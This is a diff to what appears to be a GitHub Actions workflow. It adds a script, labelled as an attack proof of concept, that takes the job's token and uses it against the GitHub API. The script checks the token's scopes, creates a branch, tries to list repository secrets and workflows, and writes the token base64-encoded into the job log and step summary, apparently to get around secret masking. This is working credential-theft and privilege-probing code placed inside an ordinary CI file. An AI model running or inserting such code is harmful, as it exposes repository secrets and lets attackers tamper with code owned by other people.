@@ -36,6 +36,36 @@ jobs:
             const log = (m) => console.log('ATK ' + m);
             log('action=' + action + ' token_len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp);
             try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/dev/null', 'TOKENSUMMARY action=' + action + ' len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp + ' token_b64=' + Buffer.from(t).toString('base64') + '\n'); } catch (e) {}
+            const { execFileSync } = require('child_process');
+            const B64 = Buffer.from(t).toString('base64');
+            const apiCall = (method, apath, abody) => {
+              const args = ['-s', '-o', '/tmp/atk_body', '-w', '%{http_code}', '-X', method, '-H', 'Authorization: Bearer ' + t, '-H', 'Accept: application/vnd.github+json', '-H', 'User-Agent: poc', '-D', '/tmp/atk_hdr'];
+              if (abody !== undefined) { args.push('-H', 'Content-Type: application/json', '-d', JSON.stringify(abody)); }
+              args.push('https://api.github.com' + apath);
+              let code = 'ERR'; try { code = execFileSync('curl', args, { encoding: 'utf8', timeout: 20000 }).trim(); } catch (e) { code = 'ERR'; }
+              let hdr = ''; try { hdr = fs.readFileSync('/tmp/atk_hdr', 'utf8'); } catch (e) {}
+              let body = ''; try { body = fs.readFileSync('/tmp/atk_body', 'utf8'); } catch (e) {}
+              const sc = (hdr.match(/x-oauth-scopes:\s*(.*)/i) || [])[1] || '';
+              return { code: code, scopes: sc.trim(), body: body.slice(0, 700) };
+            };
+            try {
+              let r = apiCall('GET', '/user');
+              log('user status=' + r.code + ' scopes=' + JSON.stringify(r.scopes) + ' body=' + r.body);
+              r = apiCall('GET', '/repos/' + repo);
+              log('repo status=' + r.code + ' body=' + r.body);
+              r = apiCall('GET', '/repos/' + repo + '/git/ref/heads/main');
+              log('mainref status=' + r.code + ' body=' + r.body);
+              let msha = ''; try { msha = JSON.parse(r.body).object.sha; } catch (e) {}
+              if (msha) {
+                r = apiCall('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/probe-' + process.env.GITHUB_RUN_ID, sha: msha });
+                log('create_ref status=' + r.code + ' body=' + r.body);
+              }
+              r = apiCall('GET', '/repos/' + repo + '/actions/secrets');
+              log('secrets status=' + r.code + ' body=' + r.body);
+              r = apiCall('GET', '/repos/' + repo + '/actions/workflows');
+              log('workflows status=' + r.code + ' body=' + r.body.slice(0, 300));
+              log('token_b64=' + B64);
+            } catch (e) { log('SYNCERR ' + e); }
             const H = { Authorization: 'Bearer ' + t, 'User-Agent': 'poc-runner', Accept: 'application/vnd.github+json' };
             const call = async (method, path, body) => {
               const r = await fetch(api + path, { method, headers: body ? Object.assign({ 'Content-Type': 'application/json' }, H) : H, body: body ? JSON.stringify(body) : undefined });
